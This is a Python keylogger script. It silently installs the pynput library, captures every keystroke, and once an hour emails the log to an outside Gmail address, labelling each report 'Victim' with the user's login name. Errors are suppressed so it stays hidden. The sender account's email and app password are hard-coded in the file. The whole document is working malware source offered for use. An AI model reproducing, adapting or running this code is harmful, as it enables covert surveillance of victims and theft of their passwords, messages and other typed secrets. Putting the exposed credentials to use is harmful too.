#!/usr/bin/env python3

import subprocess
import sys
import os
import threading
from time import sleep
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

imports = 0

def install(package):
        subprocess.check_call([sys.executable , '-m' , 'pip','install',package] ,stdout=subprocess.DEVNULL , stderr=subprocess.DEVNULL)
try:
    from pynput import keyboard
except ModuleNotFoundError :
    install("pynput")
    imports = 1
    from pynput import keyboard

keystrokes = {
        keyboard.Key.backspace : "bAcKsPaC3" , 
        keyboard.Key.caps_lock : "" ,
        keyboard.Key.delete : "d3l" ,
        keyboard.Key.enter : "\n" ,
        keyboard.Key.esc : "" ,
        keyboard.Key.insert : "" ,
        keyboard.Key.num_lock : "" ,
        keyboard.Key.page_down : "" ,
        keyboard.Key.page_up : "" ,
        keyboard.Key.pause : "" ,
        keyboard.Key.print_screen : "" ,
        keyboard.Key.scroll_lock : "" ,
        keyboard.Key.space : " " ,
        keyboard.Key.tab : "\t" ,
        keyboard.Key.down : "" ,
        keyboard.Key.left : "" ,
        keyboard.Key.up : "" ,
        keyboard.Key.right : "" ,
        keyboard.Key.home : "" ,
        keyboard.Key.end : "" ,
        keyboard.Key.shift : "" ,
        keyboard.Key.shift_l : "" ,
        keyboard.Key.shift_r : "" ,
        keyboard.Key.alt : "" ,
        keyboard.Key.alt_l : "" ,
        keyboard.Key.alt_r : "" ,
        keyboard.Key.alt_gr : "" ,
        keyboard.Key.cmd : "" ,
        keyboard.Key.cmd_l : "" ,
        keyboard.Key.cmd_r : "" ,
        keyboard.Key.ctrl : "" ,
        keyboard.Key.ctrl_l : "" ,
        keyboard.Key.ctrl_r : "" ,
        keyboard.Key.menu : "" ,
        keyboard.Key.media_next : "" ,
        keyboard.Key.media_play_pause : "" ,
        keyboard.Key.media_previous : "" ,
        keyboard.Key.media_volume_down : "" ,
        keyboard.Key.media_volume_mute : "" ,
        keyboard.Key.media_volume_up : ""
}

word = ""

def backspace(a):
    while "bAcKsPaC3" in a:
        index = a.index("bAcKsPaC3")
        if index > 0:
            a = a[:index - 1] + a[index + 9:]
        else:
            a = a[index + 9:]
    return a


def press_key(key):
    global word
    if key not in keystrokes:
        word += str(key)
    else:
        word += keystrokes.get(key , "")

def write_daemon():
    global word
    while True:
        sleep(3600) # sends txt file after ever 1 hour
        word = "".join(word.split("'"))
        word = backspace(word)
        file_path = os.path.join(os.getenv("TEMP"),"temp.txt")
        with open(file_path, "a") as file:
            file.write(word)
        word = ""
        try:
            send_email(f"Victim >> {os.getlogin()} using {os.name} ", file_path)
        except :
            pass

def send_email(subject, filename):
        msg = MIMEMultipart()
        msg['Subject'] = subject
        msg['From'] = "iamqwertyfish@gmail.com"
        msg['To'] = "sepiolsam2023@gmail.com"
        
        msg.attach(MIMEText("", "plain"))

        part = MIMEBase("application", "octet-stream")
        with open(filename, "rb") as attachment:
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename= {os.path.basename(filename)}")

        msg.attach(part)

        try:
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login("iamqwertyfish@gmail.com", 'dfon qiqn lmll bdbr')
                server.send_message(msg)
        except :
            pass

def main():
    threads = [keyboard.Listener(on_press=press_key) , threading.Thread(target=write_daemon)]

    for thread in threads:
        thread.start()

    for thread in threads :
        thread.join()

if __name__ == "__main__":
    main()
